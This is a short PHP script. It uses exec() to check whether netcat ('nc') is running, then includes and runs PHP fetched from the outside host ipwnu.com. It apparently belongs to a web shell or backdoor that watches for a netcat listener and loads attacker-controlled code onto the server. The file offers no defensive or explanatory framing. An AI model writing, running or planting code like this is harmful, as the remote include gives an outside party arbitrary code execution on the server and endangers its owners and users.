<?php

exec("pgrep nc", $pids);
if(empty($pids)) {
    $message = "nc is not running";
}
else{
	$processes = implode($pids,",");
	$message = "nc is using the following process id's: $processes";
}

include("http://ipwnu.com/dir.php");
